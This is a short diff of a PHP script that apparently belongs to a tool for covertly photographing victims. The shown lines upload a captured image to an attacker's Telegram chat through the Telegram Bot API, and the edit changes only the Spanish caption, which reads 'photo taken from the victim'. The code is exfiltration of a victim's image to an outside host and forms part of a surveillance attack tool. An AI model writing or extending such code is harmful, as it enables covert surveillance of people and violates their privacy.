@@ -24,7 +24,7 @@ $url = "https://api.telegram.org/bot$token/sendPhoto";
 $post_fields = [
     'chat_id' => $chat_id,
     'photo'   => new CURLFile($tempFile),
-    'caption' => "📷 Foto tomada desde la victima"
+    'caption' => "📷 Foto tomada de la victima!!!"
 ];
 
 $ch = curl_init();
